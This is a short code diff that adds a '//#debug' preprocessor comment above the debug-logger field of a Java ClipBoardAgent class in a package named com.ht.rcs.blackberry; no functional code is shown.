@@ -4,6 +4,7 @@ import com.ht.rcs.blackberry.utils.Debug;
 import com.ht.rcs.blackberry.utils.DebugLevel;
 
 public class ClipBoardAgent extends Agent {
+	//#debug
     static Debug debug = new Debug("ClipBoardAgent", DebugLevel.VERBOSE);
 
     public ClipBoardAgent(boolean agentStatus) {
